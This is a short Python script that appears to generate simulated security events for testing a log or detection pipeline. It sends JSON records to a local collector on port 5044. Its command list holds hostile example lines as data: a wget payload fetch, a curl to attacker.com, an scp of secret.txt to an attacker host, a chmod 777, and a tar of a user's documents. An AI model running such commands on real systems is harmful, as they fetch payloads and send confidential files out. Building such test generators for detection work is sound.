import socket, json, time
from datetime import datetime
import uuid
import random

COMMANDS = [
    "wget http://malicious.site/payload",
    "curl http://attacker.com/steal",
    "scp secret.txt attacker@10.0.0.9:/tmp/",
    "chmod 777 confidential.db",
    "tar -cf data.tar /home/alice/docs/"
]

def send_event(event):
    s = socket.socket()
    s.connect(("localhost", 5044))
    s.sendall((json.dumps(event) + "\n").encode())
    s.close()

user = random.choice(["alice", "bob", "carol", "dave", "eve"])

for cmd in COMMANDS:
    event = {
        "event_id": str(uuid.uuid4()),
        "timestamp": datetime.utcnow().isoformat(),
        "user": user,
        "action": "cmd",
        "cmd": cmd,
        "file": None,
        "bytes": None,
        "source_ip": "10.0.0.%d" % random.randint(2,254)
    }
    print("Sending suspicious command:", cmd)
    send_event(event)
    time.sleep(1)

print("Suspicious command attack complete.")
